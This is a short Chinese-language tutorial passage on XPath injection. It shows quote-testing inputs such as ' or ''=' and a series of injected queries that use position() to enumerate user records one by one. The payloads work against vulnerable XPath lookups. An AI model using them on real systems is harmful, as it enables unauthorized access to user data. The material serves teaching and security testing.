注入时，我们知道对于字符串类型，将使用单引号或双quoute，我们可以使用`" or ""=" `检查双引号，并且可以使用`  ' or ''=' `检查单引号，现在让我们假设一个简单的查询。

`/root/parent/something[username='our_input_here']/user  `

我们输入一个用户名作为查询条件，用户名将被提取。 现在我们知道，如果我们使用` ' or ''=' `使条件成立，我们将能够看到第一个用户的详细信息。 但是，我们想要逐个枚举每个用户。 因为我们知道position()函数会逐个选择每个节点。 所以我们可以用它来逐一枚举每个用户。

```
/root/parent/something[username='' or position()=1 or '']/user
/root/parent/something[username='' or position()=2 or '']/user
/root/parent/something[username='' or position()=3 or '']/user
/root/parent/something[username='' or position()=4 or '']/user
/root/parent/something[username='' or position()=5 or '']/user
```